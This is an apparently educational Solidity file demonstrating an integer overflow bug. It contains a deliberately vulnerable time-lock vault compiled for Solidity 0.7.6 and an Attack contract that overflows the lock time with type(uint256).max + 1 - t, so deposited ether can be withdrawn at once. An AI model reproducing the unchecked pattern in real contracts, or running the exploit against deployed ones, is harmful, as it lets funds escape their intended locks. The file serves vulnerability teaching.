// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;
//pragma solidity 0.8.12;
import "./console.sol";

// This contract is designed to act as a time vault.
// User can deposit into this contract but cannot withdraw for atleast a week.
// User can also extend the wait time beyond the 1 week waiting period.

/*
1. Deploy TimeLock
2. Deploy Attack with address of TimeLock
3. Call Attack.attack sending 1 ether. You will immediately be able to
   withdraw your ether.

What happened?
Attack caused the TimeLock.lockTime to overflow and was able to withdraw
before the 1 week waiting period.
*/

contract TimeLock {
    mapping(address => uint256) public balances;
    mapping(address => uint256) public lockTime;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] = block.timestamp + 1 weeks;
        console.log(
            "TimeLock.deposit(), msg.sender is %s, msg.value is %d",
            msg.sender,
            msg.value
        );
        console.log(
            "TimeLock.deposit(), balances[msg.sender] is %d, lockTime[msg.sender] is %d",
            balances[msg.sender],
            lockTime[msg.sender]
        );
    }

    function increaseLockTime(uint256 _secondsToIncrease) public {
        lockTime[msg.sender] += _secondsToIncrease;
        console.log(
            "TimeLock.increaseLockTime(), lockTime[msg.sender] is %d",
            lockTime[msg.sender]
        );
    }

    function withdraw() public {
        console.log(
            "TimeLock.withdraw(), block.timestamp is %d, lockTime[msg.sender] is %d",
            block.timestamp,
            lockTime[msg.sender]
        );
        require(balances[msg.sender] > 0, "Insufficient funds");
        require(
            block.timestamp > lockTime[msg.sender],
            "Lock time not expired"
        );

        uint256 amount = balances[msg.sender];
        balances[msg.sender] = 0;
        console.log(
            "TimeLock.withdraw(), msg.sender is %s, amount=%d",
            msg.sender,
            amount
        );
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Failed to send Ether");
        console.log("TimeLock.withdraw(), amount sent successfully!");
    }
}

contract Attack {
    TimeLock timeLock;

    constructor(TimeLock _timeLock) {
        console.log(
            "Attack.construnctor(), timelock is %s",
            address(_timeLock)
        );
        timeLock = TimeLock(_timeLock);
    }

    fallback() external payable {
        console.log("In Attack.fallback(), msg.value is %d", msg.value);
    }

    function attack() public payable {
        console.log(
            "In Attack.attack(), calling deposit() with value %d",
            msg.value
        );
        timeLock.deposit{value: msg.value}();
        /*
        if t = current lock time then we need to find x such that
        x + t = 2**256 = 0
        so x = -t
        2**256 = type(uint).max + 1
        so x = type(uint).max + 1 - t
        */
        console.log(
            "In Attack.attack(), calling increaseLockTime() with value %d",
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );
        timeLock.increaseLockTime(
            type(uint256).max + 1 - timeLock.lockTime(address(this))
        );
        console.log("In Attack.attack(), calling withdraw()");
        timeLock.withdraw();
    }
}
